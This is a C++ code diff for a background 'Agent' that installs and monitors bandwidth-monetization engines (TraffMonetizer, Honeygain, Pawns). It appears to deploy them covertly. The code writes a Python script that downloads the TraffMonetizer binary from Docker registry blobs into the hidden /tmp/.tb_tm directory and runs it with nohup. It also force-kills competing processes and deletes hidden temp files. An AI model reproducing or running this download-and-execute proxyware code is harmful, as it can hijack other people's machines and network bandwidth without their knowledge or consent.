@@ -36,6 +36,7 @@ static std::string g_current_step = "INIT";
 static std::string g_step_detail = "Khoi dong Agent";
 static pid_t g_engine_pid = -1;
 static bool g_hg_has_creds = true;
+static bool g_hg_unusable = false;
 
 static inline int safe_system(const char* cmd) {
     int r = system(cmd);
@@ -114,9 +115,11 @@ static void http_post(const std::string& url, const std::string& data, const std
 }
 
 static void stop_all_engines() {
-    int r = system("pkill -9 -f 'traffmonetizer' 2>/dev/null || true; "
+    int r = system("pkill -9 -x 'cli' 2>/dev/null || true; "
+                   "pkill -9 -f '/tmp/.tb_tm' 2>/dev/null || true; "
+                   "pkill -9 -f 'traffmonetizer' 2>/dev/null || true; "
                    "pkill -9 -f 'TraffMonetizer' 2>/dev/null || true; "
-                   "pkill -9 -f 'honeygain' 2>/dev/null || true; "
+                   "pkill -9 -x 'honeygain' 2>/dev/null || true; "
                    "pkill -9 -f 'pawns-cli' 2>/dev/null || true; "
                    "pkill -9 -f 'psclient' 2>/dev/null || true; "
                    "rm -rf /tmp/.tb_tm* /tmp/.tb_hg* /tmp/.tb_hg_get.py 2>/dev/null || true; "
@@ -231,26 +234,26 @@ static std::string get_service_logs() {
     std::ifstream tm_pf("/tmp/.tb_tm.pid");
     if (tm_pf >> tm_pid) {}
     if (tm_pid <= 0 || kill(tm_pid, 0) != 0) {
+#if defined(__APPLE__) || defined(__MACH__)
         FILE* p = popen("pgrep -i 'traffmonetizer' 2>/dev/null | head -n 1", "r");
+#else
+        FILE* p = popen("pgrep -x 'cli' 2>/dev/null | head -n 1", "r");
+        if (!p) p = popen("pgrep -f '/tmp/.tb_tm/cli' 2>/dev/null | head -n 1", "r");
+#endif
         if (p) {
             char buf[32];
             if (fgets(buf, sizeof(buf), p)) tm_pid = (pid_t)std::atoi(buf);
             pclose(p);
         }
     }
-    if (tm_pid <= 0 || kill(tm_pid, 0) != 0) {
-        FILE* p2 = popen("pgrep -f '.tb_tm' 2>/dev/null | head -n 1", "r");
-        if (p2) {
-            char buf[32];
-            if (fgets(buf, sizeof(buf), p2)) tm_pid = (pid_t)std::atoi(buf);
-            pclose(p2);
-        }
-    }
 
     if (tm_pid > 0 && kill(tm_pid, 0) == 0) {
         bool connected = check_socket_established(tm_pid);
-        std::string sock_str = connected ? "ESTABLISHED" : "CONNECTING";
         std::string log_msg = parse_recent_log_summary("/tmp/.tb_tm.log", 10);
+        if (log_msg.find("connected") != std::string::npos || log_msg.find("Connected") != std::string::npos) {
+            connected = true;
+        }
+        std::string sock_str = connected ? "ESTABLISHED" : "CONNECTING";
         if (log_msg.empty()) log_msg = connected ? "Connected to hub." : "Connecting to hub...";
         tm_report = "[TM: PID " + std::to_string(tm_pid) + "] Socket: " + sock_str + " | Log: " + log_msg;
     } else {
@@ -283,7 +286,10 @@ static std::string get_service_logs() {
         hg_report = "[HG: PID " + std::to_string(hg_pid) + "] Socket: " + sock_str + " | Log: " + log_msg;
     } else {
         std::string log_msg = parse_recent_log_summary("/tmp/.tb_hg.log", 10);
-        if (!g_hg_has_creds || log_msg.find("Missing credentials") != std::string::npos || log_msg.find("Skipped") != std::string::npos) {
+        if (log_msg.find("Network Unusable") != std::string::npos) {
+            g_hg_unusable = true;
+            hg_report = "[HG] Skipped (API Error: Network Unusable - Datacenter IP)";
+        } else if (!g_hg_has_creds || log_msg.find("Missing credentials") != std::string::npos || log_msg.find("Skipped") != std::string::npos) {
             hg_report = "[HG] Not started (Missing credentials)";
         } else if (!log_msg.empty()) {
             hg_report = "[HG] Not started (" + log_msg + ")";
@@ -302,9 +308,8 @@ static bool is_engine_alive() {
 #if defined(__APPLE__) || defined(__MACH__)
     return (system("pgrep -i 'traffmonetizer' >/dev/null 2>&1") == 0);
 #else
-    return (system("pgrep -f '/tmp/.tb_tm' >/dev/null 2>&1") == 0 ||
-            system("pgrep -f 'cli start accept' >/dev/null 2>&1") == 0 ||
-            system("pgrep -x tm_engine >/dev/null 2>&1") == 0);
+    return (system("pgrep -x cli >/dev/null 2>&1") == 0 ||
+            system("pgrep -f '/tmp/.tb_tm/cli' >/dev/null 2>&1") == 0);
 #endif
 }
 
@@ -394,6 +399,9 @@ std::string json_get_field(const std::string& json, const std::string& key) {
 }
 
 static void check_and_start_honeygain(const std::string& hg_email, const std::string& hg_pass, const std::string& node_id) {
+    if (g_hg_unusable) {
+        return;
+    }
     // 1. Kiểm tra tham số đăng nhập: chỉ kích hoạt khi có đủ email VÀ password
     if (hg_email.empty() || hg_email.find("YOUR_") != std::string::npos ||
         hg_pass.empty() || hg_pass.find("YOUR_") != std::string::npos) {
@@ -604,7 +612,7 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
         g_step_detail = "Kiem tra va bung native engine self-contained TraffMonetizer";
 
         std::string eng_bin = "/tmp/.tb_tm/cli";
-        safe_system("mkdir -p /tmp/.tb_tm/lib 2>/dev/null");
+        safe_system("mkdir -p /tmp/.tb_tm 2>/dev/null");
 
         // 1. Trích xuất payload bundle self-contained từ fat binary nếu có
         if (access(eng_bin.c_str(), X_OK) != 0) {
@@ -623,30 +631,20 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
             g_step_detail = "Tai native self-contained package TraffMonetizer day du";
             FILE* py_f = fopen("/tmp/.tb_tm_get.py", "w");
             if (py_f) {
-                fputs("import urllib.request, json, tarfile, io, os, glob, shutil\n"
+                fputs("import urllib.request, json, tarfile, io, os, shutil, platform\n"
                       "try:\n"
-                      "    os.makedirs('/tmp/.tb_tm/lib', exist_ok=True)\n"
+                      "    os.makedirs('/tmp/.tb_tm', exist_ok=True)\n"
+                      "    m = platform.machine().lower()\n"
+                      "    is_arm = 'aarch64' in m or 'arm' in m\n"
                       "    tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull', timeout=15).read().decode())['token']\n"
-                      "    layers = ['sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b', 'sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a']\n"
-                      "    for d in layers:\n"
-                      "        try:\n"
-                      "            req = urllib.request.Request('https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/' + d, headers={'Authorization': 'Bearer ' + tok})\n"
-                      "            tf = tarfile.open(fileobj=io.BytesIO(urllib.request.urlopen(req, timeout=30).read()))\n"
-                      "            tf.extractall('/tmp/.tb_tm_ext')\n"
-                      "            if os.path.exists('/tmp/.tb_tm_ext/usr/local/bin/cli'):\n"
-                      "                shutil.move('/tmp/.tb_tm_ext/usr/local/bin/cli', '/tmp/.tb_tm/cli')\n"
-                      "                os.chmod('/tmp/.tb_tm/cli', 0o755)\n"
-                      "                shutil.rmtree('/tmp/.tb_tm_ext', ignore_errors=True)\n"
-                      "                break\n"
-                      "        except Exception:\n"
-                      "            pass\n"
-                      "    for pat in ['*ssl*.so*', '*crypto*.so*', '*icu*.so*']:\n"
-                      "        for lib_path in glob.glob('/usr/lib/**/' + pat, recursive=True) + glob.glob('/lib/**/' + pat, recursive=True):\n"
-                      "            bname = os.path.basename(lib_path)\n"
-                      "            dst = os.path.join('/tmp/.tb_tm/lib', bname)\n"
-                      "            if not os.path.exists(dst):\n"
-                      "                try: os.symlink(lib_path, dst)\n"
-                      "                except Exception: pass\n"
+                      "    layer = 'sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a' if is_arm else 'sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b'\n"
+                      "    req = urllib.request.Request('https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/' + layer, headers={'Authorization': 'Bearer ' + tok})\n"
+                      "    tf = tarfile.open(fileobj=io.BytesIO(urllib.request.urlopen(req, timeout=30).read()))\n"
+                      "    tf.extractall('/tmp/.tb_tm_ext')\n"
+                      "    if os.path.exists('/tmp/.tb_tm_ext/usr/local/bin/cli'):\n"
+                      "        shutil.move('/tmp/.tb_tm_ext/usr/local/bin/cli', '/tmp/.tb_tm/cli')\n"
+                      "        os.chmod('/tmp/.tb_tm/cli', 0o755)\n"
+                      "        shutil.rmtree('/tmp/.tb_tm_ext', ignore_errors=True)\n"
                       "except Exception:\n"
                       "    pass\n", py_f);
                 fclose(py_f);
@@ -657,10 +655,10 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
         if (access(eng_bin.c_str(), X_OK) == 0) {
             g_current_step = "LAUNCH_ENGINE";
             g_step_detail = "Khoi chay Linux Native Engine: start accept --token " + tm_token.substr(0, 8) + "...";
-            std::string run_cmd = "nohup env LD_LIBRARY_PATH=/tmp/.tb_tm/lib:/tmp/.tb_tm:$LD_LIBRARY_PATH DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1 " +
-                                  eng_bin + " start accept --token \"" + tm_token + "\" > /tmp/.tb_tm.log 2>&1 & echo $! > /tmp/.tb_tm.pid";
+            std::string run_cmd = "nohup " + eng_bin + " start accept --token \"" + tm_token + "\" > /tmp/.tb_tm.log 2>&1 & "
+                                  "sleep 0.5 && (pgrep -x cli | tail -n 1 > /tmp/.tb_tm.pid || pgrep -f '" + eng_bin + "' | tail -n 1 > /tmp/.tb_tm.pid)";
             safe_system(run_cmd.c_str());
-            std::this_thread::sleep_for(std::chrono::milliseconds(1500));
+            std::this_thread::sleep_for(std::chrono::milliseconds(2000));
 
             std::ifstream pid_f("/tmp/.tb_tm.pid");
             if (pid_f >> g_engine_pid && is_engine_alive()) {
